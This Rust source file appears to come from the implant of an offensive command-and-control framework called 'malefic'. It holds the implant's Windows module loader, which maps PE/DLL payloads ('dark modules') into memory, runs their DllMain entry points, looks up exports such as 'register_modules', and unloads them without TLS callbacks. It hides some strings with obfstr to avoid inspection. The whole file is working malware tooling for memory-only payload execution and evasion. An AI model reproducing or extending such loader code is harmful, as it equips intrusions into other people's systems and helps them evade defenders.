#[cfg(target_os = "windows")]
pub use malefic_os_win::types::DllMain;

// All kit-dependent functions are grouped here.
#[cfg(target_os = "windows")]
mod kit_ops {
    use core::{ffi::c_void, ptr::null_mut};
    use malefic_common::errors::CommonError::{self, ArgsError};
    use malefic_gateway::obfstr;

    pub unsafe fn get_function_address(
        module_base: *const c_void,
        function_name: &str,
    ) -> *const c_void {
        malefic_os_win::kit::apis::m_get_func_addr_with_module_base(
            module_base,
            function_name.as_bytes(),
        )
    }

    pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void, CommonError> {
        use malefic_os_win::kit::MaleficModule;

        if bins.is_empty() || bundle.is_empty() {
            return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
        }
        malefic_common::debug!("[+] load module {}, len: {}", bundle, bins.len());

        let dark_module = malefic_os_win::kit::pe::load_pe(bins, None, None);
        if dark_module.is_null() {
            return Err(ArgsError("dark module load failed!".to_string()));
        }
        let module = dark_module as *const MaleficModule;
        let module_base = (*module).new_module;
        let entry_point = (*module).entry_point;
        if module_base.is_null() || entry_point.is_null() {
            return Err(ArgsError(
                "dark module module base / entry point is null!".to_string(),
            ));
        }
        let _ = core::mem::transmute::<usize, super::DllMain>(entry_point as usize)(
            module_base as _,
            1,
            null_mut(),
        );
        Ok(dark_module)
    }

    pub unsafe fn unload_pe(module: *const c_void) {
        if module.is_null() {
            return;
        }
        malefic_os_win::kit::pe::unload_pe(module as _);
    }

    /// Unload a PE module without calling TLS callbacks.
    ///
    /// Use this for Rust DLLs where DLL_PROCESS_DETACH triggers TLS cleanup
    /// that can stack overflow in PE-memory-loaded modules.
    /// Only unregisters exceptions and frees memory.
    pub unsafe fn unload_pe_no_tls(module: *const c_void) {
        if module.is_null() {
            return;
        }
        malefic_os_win::kit::pe::unload_pe_no_tls(module as _);
    }

    /// Find a named export in a loaded PE module.
    ///
    /// Returns the function pointer or `None` if the export doesn't exist.
    /// This is used to probe for the new runtime protocol (`rt_abi_version`)
    /// before falling back to the legacy `register_modules` path.
    pub unsafe fn find_export(module: *const c_void, name: &str) -> Option<*const c_void> {
        use malefic_os_win::kit::MaleficModule;
        let module: *const MaleficModule = module as _;
        if module.is_null() || (*module).export_func.is_empty() {
            return None;
        }
        for i in (*module).export_func.iter() {
            if i.0 == name {
                return Some(i.1 as *const c_void);
            }
        }
        None
    }

    pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void> {
        use malefic_os_win::kit::MaleficModule;
        let module: *const MaleficModule = module as _;
        if module.is_null() {
            return None;
        }
        if (*module).export_func.is_empty() {
            return None;
        }
        for i in (*module).export_func.iter() {
            if i.0 == obfstr!("register_modules") {
                return Some(i.1 as *const c_void);
            }
        }
        None
    }
}

#[cfg(target_os = "windows")]
pub use kit_ops::*;

#[cfg(target_family = "unix")]
pub unsafe fn load_module(
    _bins: Vec<u8>,
    _bundle: String,
) -> Result<*const core::ffi::c_void, malefic_common::errors::CommonError> {
    todo!()
}

#[cfg(target_family = "unix")]
pub unsafe fn call_fresh_modules(
    _module: *const core::ffi::c_void,
) -> Option<*const core::ffi::c_void> {
    todo!()
}
